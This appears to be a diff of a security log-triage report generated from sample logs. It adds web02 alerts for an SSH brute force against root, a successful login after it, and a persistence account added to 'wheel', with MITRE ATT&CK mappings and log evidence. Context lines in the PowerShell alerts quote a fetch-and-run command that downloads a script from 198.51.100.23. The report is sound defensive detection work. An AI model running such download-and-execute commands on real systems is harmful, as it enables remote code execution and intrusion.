@@ -1,12 +1,12 @@
 # Log triage report
 
-Generated from 85 security events in: `sample_logs/auth.log`, `sample_logs/sysmon.jsonl`, `sample_logs/windows_security.jsonl`
+Generated from 103 security events in: `sample_logs/audit.log`, `sample_logs/auth.log`, `sample_logs/sysmon.jsonl`, `sample_logs/windows_security.jsonl`
 
 | Severity | Alerts |
 |---|---|
-| critical | 3 |
+| critical | 5 |
 | high | 7 |
-| medium | 6 |
+| medium | 8 |
 | low | 0 |
 
 ## MITRE ATT&CK coverage
@@ -17,13 +17,13 @@ Generated from 85 security events in: `sample_logs/auth.log`, `sample_logs/sysmo
 | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | 2 |
 | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Indicator Removal: Clear Windows Event Logs | 1 |
 | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | 1 |
-| [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | 1 |
-| [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | 2 |
+| [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | 2 |
+| [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | 3 |
 | [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | 3 |
-| [T1110](https://attack.mitre.org/techniques/T1110/) | Brute Force | 1 |
-| [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | 2 |
+| [T1110](https://attack.mitre.org/techniques/T1110/) | Brute Force | 2 |
+| [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | 3 |
 | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Brute Force: Password Spraying | 1 |
-| [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | 4 |
+| [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | 6 |
 | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution: Malicious File | 4 |
 | [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | 2 |
 
@@ -75,7 +75,53 @@ Nov 10 02:19:55 web01 usermod[41305]: add 'svc-backup' to group 'sudo'
 
 </details>
 
-### 3. [CRITICAL] Newly created account added to privileged group (ACCT-003)
+### 3. [CRITICAL] Successful login after repeated failures (AUTH-003)
+
+- **Time:** 2026-11-10 03:40:00 to 2026-11-10 03:41:30 UTC (15 events)
+- **Host:** `web02`
+- **User:** `root`
+- **Source IP:** `203.0.113.60` (external)
+- **ATT&CK:** T1110 Brute Force, T1078 Valid Accounts
+
+root logged in from 203.0.113.60 after 14 failures from that IP in the previous 30 min (14 of them against this account). Treat as compromised until proven otherwise.
+
+<details><summary>Evidence</summary>
+
+```
+node=web02 type=USER_AUTH msg=audit(1794282000.000:9102): pid=800 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282006.000:9104): pid=801 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282012.000:9106): pid=802 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282018.000:9108): pid=803 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282024.000:9110): pid=804 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+... 5 more ...
+node=web02 type=USER_AUTH msg=audit(1794282060.000:9122): pid=810 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282066.000:9124): pid=811 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282072.000:9126): pid=812 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282078.000:9128): pid=813 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_LOGIN msg=audit(1794282090.200:9131): pid=900 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=login acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=success'
+```
+
+</details>
+
+### 4. [CRITICAL] Newly created account added to privileged group (ACCT-003)
+
+- **Time:** 2026-11-10 03:44:00 to 2026-11-10 03:45:00 UTC (1 events)
+- **Host:** `web02`
+- **User:** `systemd-sync`
+- **ATT&CK:** T1098 Account Manipulation, T1136.001 Create Account: Local Account
+
+'systemd-sync' added to 'wheel' on web02, only 0 min after the account was created. Classic persistence pattern.
+
+<details><summary>Evidence</summary>
+
+```
+node=web02 type=ADD_USER msg=audit(1794282240.100:9133): pid=950 uid=0 auid=0 ses=7 msg='op=add-user acct=73797374656D642D73796E63 exe="/usr/sbin/useradd" hostname=? addr=? terminal=pts/0 res=success'
+node=web02 type=USER_MGMT msg=audit(1794282300.000:9134): pid=960 uid=0 auid=0 ses=7 msg='op=add-user-to-group grp="wheel" acct="systemd-sync" exe="/usr/sbin/usermod" hostname=? addr=? terminal=pts/0 res=success'
+```
+
+</details>
+
+### 5. [CRITICAL] Newly created account added to privileged group (ACCT-003)
 
 - **Time:** 2026-11-10 09:41:00 to 2026-11-10 09:43:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -93,7 +139,7 @@ Nov 10 02:19:55 web01 usermod[41305]: add 'svc-backup' to group 'sudo'
 
 </details>
 
-### 4. [HIGH] Password spraying from single source (AUTH-002)
+### 6. [HIGH] Password spraying from single source (AUTH-002)
 
 - **Time:** 2026-11-10 04:13:27 to 2026-11-10 04:18:41 UTC (20 events)
 - **Host:** `web01`
@@ -120,7 +166,7 @@ Nov 10 04:18:41 web01 sshd[41329]: Failed password for invalid user support from
 
 </details>
 
-### 5. [HIGH] Executable or script written by Office application (FILE-001)
+### 7. [HIGH] Executable or script written by Office application (FILE-001)
 
 - **Time:** 2026-11-10 09:13:54 to 2026-11-10 09:13:54 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -137,7 +183,7 @@ winword.exe wrote C:\Users\thandi\AppData\Local\Temp\~invoice.vbs. Hash the file
 
 </details>
 
-### 6. [HIGH] Encoded PowerShell command (EXEC-001)
+### 8. [HIGH] Encoded PowerShell command (EXEC-001)
 
 - **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -160,7 +206,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
 
 </details>
 
-### 7. [HIGH] Encoded PowerShell command (EXEC-001)
+### 9. [HIGH] Encoded PowerShell command (EXEC-001)
 
 - **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -183,7 +229,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
 
 </details>
 
-### 8. [HIGH] Office application spawned a shell or script host (EXEC-002)
+### 10. [HIGH] Office application spawned a shell or script host (EXEC-002)
 
 - **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -200,7 +246,7 @@ winword.exe started powershell.exe. Documents should not launch interpreters; th
 
 </details>
 
-### 9. [HIGH] Office application spawned a shell or script host (EXEC-002)
+### 11. [HIGH] Office application spawned a shell or script host (EXEC-002)
 
 - **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -217,7 +263,7 @@ winword.exe started powershell.exe. Documents should not launch interpreters; th
 
 </details>
 
-### 10. [HIGH] Security event log cleared (EVADE-001)
+### 12. [HIGH] Security event log cleared (EVADE-001)
 
 - **Time:** 2026-11-10 09:55:00 to 2026-11-10 09:55:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -234,7 +280,7 @@ Security log on WS-FIN-07.corp.example was cleared by thandi. Attackers do this 
 
 </details>
 
-### 11. [MEDIUM] Brute force against account(s) (AUTH-001)
+### 13. [MEDIUM] Brute force against account(s) (AUTH-001)
 
 - **Time:** 2026-11-10 02:13:06 to 2026-11-10 02:15:46 UTC (24 events)
 - **Host:** `web01`
@@ -262,7 +308,7 @@ Nov 10 02:15:46 web01 sshd[41243]: Failed password for root from 203.0.113.45 po
 
 </details>
 
-### 12. [MEDIUM] Local account created (ACCT-001)
+### 14. [MEDIUM] Local account created (ACCT-001)
 
 - **Time:** 2026-11-10 02:18:55 to 2026-11-10 02:18:55 UTC (1 events)
 - **Host:** `web01`
@@ -279,7 +325,52 @@ Nov 10 02:18:55 web01 useradd[41301]: new user: name=svc-backup, UID=1003, GID=1
 
 </details>
 
-### 13. [MEDIUM] Script host connected to external address (NET-001)
+### 15. [MEDIUM] Brute force against account(s) (AUTH-001)
+
+- **Time:** 2026-11-10 03:40:00 to 2026-11-10 03:41:18 UTC (14 events)
+- **Host:** `web02`
+- **User:** `root`
+- **Source IP:** `203.0.113.60` (external)
+- **ATT&CK:** T1110.001 Brute Force: Password Guessing
+
+203.0.113.60 failed 14 logins (at least 10 within 5 min).
+
+<details><summary>Evidence</summary>
+
+```
+node=web02 type=USER_AUTH msg=audit(1794282000.000:9102): pid=800 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282006.000:9104): pid=801 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282012.000:9106): pid=802 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282018.000:9108): pid=803 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282024.000:9110): pid=804 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+... 4 more ...
+node=web02 type=USER_AUTH msg=audit(1794282054.000:9120): pid=809 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282060.000:9122): pid=810 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282066.000:9124): pid=811 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282072.000:9126): pid=812 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+node=web02 type=USER_AUTH msg=audit(1794282078.000:9128): pid=813 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=203.0.113.60 addr=203.0.113.60 terminal=ssh res=failed'
+```
+
+</details>
+
+### 16. [MEDIUM] Local account created (ACCT-001)
+
+- **Time:** 2026-11-10 03:44:00 to 2026-11-10 03:44:00 UTC (1 events)
+- **Host:** `web02`
+- **User:** `systemd-sync`
+- **ATT&CK:** T1136.001 Create Account: Local Account
+
+New account 'systemd-sync' created on web02.
+
+<details><summary>Evidence</summary>
+
+```
+node=web02 type=ADD_USER msg=audit(1794282240.100:9133): pid=950 uid=0 auid=0 ses=7 msg='op=add-user acct=73797374656D642D73796E63 exe="/usr/sbin/useradd" hostname=? addr=? terminal=pts/0 res=success'
+```
+
+</details>
+
+### 17. [MEDIUM] Script host connected to external address (NET-001)
 
 - **Time:** 2026-11-10 09:14:06 to 2026-11-10 09:14:18 UTC (3 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -298,7 +389,7 @@ powershell.exe on WS-FIN-07.corp.example connected to 198.51.100.23:80 3 time(s)
 
 </details>
 
-### 14. [MEDIUM] Executable or script written by script host (FILE-001)
+### 18. [MEDIUM] Executable or script written by script host (FILE-001)
 
 - **Time:** 2026-11-10 09:14:30 to 2026-11-10 09:14:30 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -315,7 +406,7 @@ powershell.exe wrote C:\Users\thandi\AppData\Local\Temp\update.exe. Hash the fil
 
 </details>
 
-### 15. [MEDIUM] Brute force against account(s) (AUTH-001)
+### 19. [MEDIUM] Brute force against account(s) (AUTH-001)
 
 - **Time:** 2026-11-10 09:30:00 to 2026-11-10 09:32:48 UTC (15 events)
 - **Host:** `JUMP01.corp.example`
@@ -343,7 +434,7 @@ powershell.exe wrote C:\Users\thandi\AppData\Local\Temp\update.exe. Hash the fil
 
 </details>
 
-### 16. [MEDIUM] Local account created (ACCT-001)
+### 20. [MEDIUM] Local account created (ACCT-001)
 
 - **Time:** 2026-11-10 09:41:00 to 2026-11-10 09:41:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
